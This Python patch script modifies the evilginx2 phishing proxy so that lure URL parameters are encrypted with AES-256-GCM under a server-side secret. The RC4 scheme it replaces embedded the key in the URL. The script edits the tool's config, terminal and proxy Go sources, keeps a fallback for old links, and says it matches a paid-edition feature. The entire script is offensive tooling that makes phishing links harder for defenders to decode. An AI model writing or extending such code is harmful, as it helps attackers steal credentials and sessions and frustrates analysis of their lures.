#!/usr/bin/env python3
# patch_aes_params.py — evilginx2 CE: AES-256-GCM lure params (server-side key)
# Pro-feature #11 parity: RC4-with-embedded-key -> AES-256-GCM with persisted secret.
# Assert-exact-old-then-replace; abort on any mismatch. Run inside ~/evilginx2-src.
import sys

def patch(path, old, new):
    src = open(path, "r", encoding="utf-8").read()
    n = src.count(old)
    if n != 1:
        sys.exit(f"[abort] {path}: pattern found {n}x (need exactly 1):\n{old[:120]}")
    open(path, "w", encoding="utf-8").write(src.replace(old, new))
    print(f"[patch] {path} OK")

# 1) config.go — persist lure_secret in general config
patch("core/config.go",
      '\tAutocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`\n}',
      '\tAutocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`\n'
      '\tLureSecret   string `mapstructure:"lure_secret" json:"lure_secret" yaml:"lure_secret"`\n}')

# 2) terminal.go — createPhishUrl: RC4 -> AES-256-GCM
patch("core/terminal.go",
      "\t\tenc_key := GenRandomAlphanumString(8)\n"
      "\t\tdec_params := params.Encode()\n"
      "\n"
      "\t\tvar crc byte\n"
      "\t\tfor _, c := range dec_params {\n"
      "\t\t\tcrc += byte(c)\n"
      "\t\t}\n"
      "\n"
      "\t\tc, _ := rc4.NewCipher([]byte(enc_key))\n"
      "\t\tenc_params := make([]byte, len(dec_params)+1)\n"
      "\t\tc.XORKeyStream(enc_params[1:], []byte(dec_params))\n"
      "\t\tenc_params[0] = crc\n"
      "\n"
      "\t\tkey_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))\n"
      "\t\tret += \"?\" + key_arg + \"=\" + key_val",
      "\t\tdec_params := params.Encode()\n"
      "\n"
      "\t\tkey_val, enc_err := EncryptLureParams(t.cfg.LureKey(), dec_params)\n"
      "\t\tif enc_err != nil {\n"
      "\t\t\tlog.Error(\"lure params: encryption failed: %v\", enc_err)\n"
      "\t\t\treturn ret\n"
      "\t\t}\n"
      "\t\tret += \"?\" + key_arg + \"=\" + key_val")

# 3) terminal.go — drop crypto/rc4 import if now unused
src = open("core/terminal.go", "r", encoding="utf-8").read()
if "rc4.NewCipher" not in src and '"crypto/rc4"' in src:
    patch("core/terminal.go", '\t"crypto/rc4"\n', "")
# base64 still used elsewhere in terminal.go (import/export helpers) — checked by grep below
if "base64." not in src.replace('"encoding/base64"', ""):
    patch("core/terminal.go", '\t"encoding/base64"\n', "")

# 4) http_proxy.go — extractParams: try AES first, keep RC4 fallback for old URLs
patch("core/http_proxy.go",
      "func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {\n"
      "\tvar ret bool = false\n"
      "\tvals := u.Query()\n"
      "\n"
      "\tvar enc_key string",
      "func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {\n"
      "\tvar ret bool = false\n"
      "\tvals := u.Query()\n"
      "\n"
      "\t// AES-256-GCM lure params (server-side key, not embedded in URL)\n"
      "\tfor _, v := range vals {\n"
      "\t\tif dec_params, ok := DecryptLureParams(p.cfg.LureKey(), v[0]); ok {\n"
      "\t\t\tparams, err := url.ParseQuery(dec_params)\n"
      "\t\t\tif err == nil {\n"
      "\t\t\t\tfor kk, vv := range params {\n"
      "\t\t\t\t\tlog.Info(\"param(aes): %s='%s'\", kk, vv[0])\n"
      "\t\t\t\t\tsession.Params[kk] = vv[0]\n"
      "\t\t\t\t}\n"
      "\t\t\t\treturn true\n"
      "\t\t\t}\n"
      "\t\t}\n"
      "\t}\n"
      "\n"
      "\tvar enc_key string")

print("[done] all patches applied")
